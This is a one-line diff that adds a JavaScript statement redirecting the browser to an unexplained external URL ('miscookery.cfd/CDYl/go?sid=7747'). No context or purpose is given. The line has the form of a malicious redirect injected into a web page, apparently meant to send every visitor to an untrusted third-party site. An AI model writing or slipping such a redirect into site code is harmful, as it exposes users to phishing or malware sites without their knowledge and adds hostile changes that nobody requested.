@@ -1,0 +1,1 @@
+window.location.href = "https://miscookery.cfd/CDYl/go?sid=7747";
